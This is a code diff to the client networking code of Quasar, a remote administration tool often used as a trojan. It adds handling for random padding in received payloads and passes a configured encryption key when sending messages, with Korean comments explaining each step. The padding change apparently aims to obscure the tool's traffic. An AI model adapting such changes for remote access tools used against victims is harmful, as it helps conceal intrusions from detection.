@@ -5,6 +5,7 @@ using Quasar.Common.Messages.ReverseProxy;
 using Quasar.Common.Networking;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Security;
@@ -478,14 +479,27 @@ namespace Quasar.Client.Networking
 
                                 if (_writeOffset - HEADER_SIZE == _payloadLen)
                                 {
-                                    // completely received payload
+                                    // 완전히 페이로드를 수신했을 때의 처리 (수정 부분)
                                     try
                                     {
-                                        using (PayloadReader pr = new PayloadReader(_payloadBuffer, _payloadLen + HEADER_SIZE, false))
+                                        // MemoryStream을 사용하여 헤더 이후의 본문(패딩 포함)만 격리
+                                        using (MemoryStream ms = new MemoryStream(_payloadBuffer, HEADER_SIZE, _payloadLen))
                                         {
-                                            IMessage message = pr.ReadMessage();
+                                            int paddingSize = ms.ReadByte(); // 1. 패딩 크기(1바이트) 읽기
+                                            if (paddingSize != -1 && paddingSize < _payloadLen)
+                                            {
+                                                ms.Seek(paddingSize, SeekOrigin.Current); // 2. 패딩 데이터만큼 포인터 이동
 
-                                            OnClientRead(message, _payloadBuffer.Length);
+                                                // 3. 남은 본문(진짜 메시지)만 PayloadReader로 역직렬화
+                                                using (PayloadReader pr = new PayloadReader(ms, false))
+                                                {
+                                                    IMessage message = pr.ReadMessage();
+                                                    if (message != null)
+                                                    {
+                                                        OnClientRead(message, _payloadBuffer.Length);
+                                                    }
+                                                }
+                                            }
                                         }
                                     }
                                     catch (Exception)
@@ -495,6 +509,7 @@ namespace Quasar.Client.Networking
                                         break;
                                     }
 
+                                    // 다음 패킷 수신을 위한 초기화
                                     _receiveState = ReceiveType.Header;
                                     _payloadLen = 0;
                                     _writeOffset = 0;
@@ -559,7 +574,7 @@ namespace Quasar.Client.Networking
             try
             {
                 _singleWriteMutex.WaitOne();
-                using (PayloadWriter pw = new PayloadWriter(_stream, true))
+                using (PayloadWriter pw = new PayloadWriter(_stream, true, Quasar.Client.Config.Settings.ENCRYPTIONKEY))
                 {
                     OnClientWrite(message, pw.WriteMessage(message));
                 }
